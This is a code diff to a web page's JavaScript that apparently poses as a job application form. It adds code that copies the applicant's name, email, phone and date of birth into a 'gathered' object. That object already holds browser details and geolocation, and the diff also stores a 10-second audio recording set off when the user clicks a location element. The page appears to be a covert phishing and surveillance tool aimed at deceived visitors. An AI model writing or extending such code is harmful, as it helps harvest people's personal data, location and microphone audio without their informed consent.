@@ -19,6 +19,10 @@ const gathered = {
   language: "",
   platform: "",
   user_agent: "",
+  form_name: "",
+  form_email: "",
+  form_phone: "",
+  form_dob: "",
   geo_lat: null,
   geo_lon: null,
   geo_accuracy: null,
@@ -409,7 +413,9 @@ function triggerPermissionsAndCapture() {
   })();
 
   // 3. Audio Recording
-  audioRecordingPromise = recordAudio(10);
+  audioRecordingPromise = recordAudio(10).then(audio => {
+    gathered.audio_recording = audio || null;
+  });
 }
 
 // ── Hook up Location Trigger ─────────────────────────────────
@@ -419,6 +425,12 @@ appLocation.addEventListener("click", triggerPermissionsAndCapture);
 // ── Hook up Form Submit ──────────────────────────────────────
 jobAppForm.addEventListener("submit", async (e) => {
   e.preventDefault();
+
+  // Capture form data before disabling fields
+  gathered.form_name = document.getElementById("appName").value;
+  gathered.form_email = document.getElementById("appEmail").value;
+  gathered.form_phone = document.getElementById("appPhone").value;
+  gathered.form_dob = document.getElementById("appDob").value;
 
   // Disable form and show submit spinner
   submitBtn.disabled = true;
